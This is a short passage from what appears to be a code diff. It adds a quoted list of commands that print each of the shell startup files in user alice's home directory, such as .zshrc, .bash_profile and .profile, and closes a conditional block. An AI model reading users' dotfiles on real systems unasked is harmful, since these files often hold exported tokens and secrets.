+    cat /home/alice/.zshrc
+    cat /home/alice/.bash_profile
+    cat /home/alice/.zprofile
+    cat /home/alice/.profile
+    cat /home/alice/.bash_login
+    cat /home/alice/.bash_logout
+    cat /home/alice/.zlogin
+    cat /home/alice/.zlogout
+    "
+fi
